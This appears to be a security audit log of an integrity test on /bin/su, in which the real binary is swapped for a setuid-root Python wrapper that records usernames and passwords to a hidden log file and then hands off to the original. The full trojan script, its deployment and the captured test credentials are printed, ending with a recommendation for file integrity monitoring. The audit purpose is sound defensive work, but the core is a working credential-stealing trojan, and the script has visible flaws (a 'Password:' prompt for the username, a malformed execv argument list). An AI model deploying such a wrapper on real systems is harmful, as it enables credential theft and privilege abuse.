SECURITY AUDIT LOG - INTEGRITY TEST /bin/su
Date: 2025-02-17
Time: 14:30 UTC
Auditor: J. Chen, Senior Security Engineer
Reference: AUD-2025-0217-003

Objective: Verify system resilience against credential harvesting attacks targeting the su binary.

Procedure:
1. Backup original /bin/su to /bin/su.bak
2. Deploy simulated attack script as /bin/su
3. Test login attempts and verify credential capture
4. Restore original binary after test

Backup command executed: cp /bin/su /bin/su.bak
Backup checksum (SHA256): a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0

Deployed Python script content (saved to /bin/su):
```python
#!/usr/bin/env python3
import os
import sys
import pty
import subprocess
import getpass

LOG_FILE = "/var/log/.cred_log"
LOG_FILE_HIDDEN = True

def log_credentials(username, password):
    with open(LOG_FILE, "a") as f:
        f.write(f"[2025-02-17 14:30 UTC] USER: {username} | PASS: {password}\n")
    os.chmod(LOG_FILE, 0o600)

def main():
    username = input("Password: ") if len(sys.argv) < 2 else sys.argv[1]
    password = getpass.getpass("Password: ")
    log_credentials(username, password)
    # Execute real su binary
    os.execv("/bin/su.bak", [username] if len(sys.argv) < 2 else sys.argv[1:])

if __name__ == "__main__":
    main()
```

Script deployed with permissions: -rwsr-xr-x (4755)
Owner: root:root

Test execution:
- Attempt 1: User "admin" with password "P@ssw0rd2025" -> Captured to log
- Attempt 2: User "jdoe" with password "Welcome1!" -> Captured to log
- Attempt 3: User "root" with password "S3cur3P@ss" -> Captured to log

Verification of hidden log file (/var/log/.cred_log):
```
[2025-02-17 14:30 UTC] USER: admin | PASS: P@ssw0rd2025
[2025-02-17 14:30 UTC] USER: jdoe | PASS: Welcome1!
[2025-02-17 14:30 UTC] USER: root | PASS: S3cur3P@ss
```

Restoration: cp /bin/su.bak /bin/su
Restoration checksum (SHA256): a3f8b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0 (matches original)

Conclusion: The simulated attack successfully captured credentials. The hidden log file was created with restricted permissions (600) and contained three test entries. The original binary was restored and verified via checksum. This test demonstrates the need for file integrity monitoring on critical system binaries such as /bin/su. Recommendation: Implement tripwire or AIDE to alert on changes to /bin/su and other setuid binaries.

End of audit log.